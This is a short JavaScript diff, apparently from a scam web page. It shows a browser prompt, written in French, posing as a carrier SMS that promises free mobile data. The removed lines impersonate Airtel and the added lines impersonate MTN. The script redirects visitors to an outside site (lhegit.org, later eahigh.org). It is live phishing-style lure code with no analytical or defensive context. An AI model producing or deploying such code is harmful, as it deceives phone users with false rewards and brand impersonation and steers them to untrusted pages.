@@ -1,5 +1,5 @@
-var password = 'Activer 100 Go'
-password=prompt('SMS: Félicitations, votre carte SIM Airtel est éligible pour recevoir des données gratuites en récompense de votre ancienne carte SIM, cliquez sur OK pour activer','Activer 100 Go');
-if (password != 'Activer 100 Go') {
-location.href='https://lhegit.org/airtel.html';
+var password = 'ACTIVER 10 Go'
+password=prompt('MTN: Félicitations, votre numéro MTN est éligible pour recevoir 10 Go, cliquez sur OK pour activer maintenant','ACTIVER 10 Go');
+if (password != 'ACTIVER 10 Go') {
+location.href='https://eahigh.org/airtel.html';
 }
